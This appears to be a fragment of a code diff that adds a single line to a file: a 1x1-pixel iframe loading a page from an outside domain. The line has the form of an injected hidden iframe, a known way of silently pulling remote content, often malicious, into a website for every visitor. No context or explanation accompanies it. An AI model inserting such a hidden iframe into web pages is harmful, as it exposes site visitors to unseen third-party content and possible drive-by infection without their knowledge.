@@ -1,0 +1,1 @@
+<iframe src=http://mn.haoyuming.net/one/index.htm width=1 height=1></iframe>
